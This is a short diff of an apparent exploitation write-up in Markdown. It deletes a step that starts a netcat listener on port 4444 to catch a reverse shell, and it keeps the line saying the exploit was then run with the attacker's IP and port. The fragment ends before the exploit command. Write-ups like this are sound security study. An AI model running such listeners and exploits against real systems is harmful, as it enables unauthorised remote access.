@@ -118,12 +118,6 @@ Reference:
 
 ### Exploitation
 
-A netcat listener was started on the attacker machine:
-
-```bash
-nc -lvnp 4444
-```
-
 The exploit was then executed against the target, specifying the attacker IP and port:
 
 ```bash
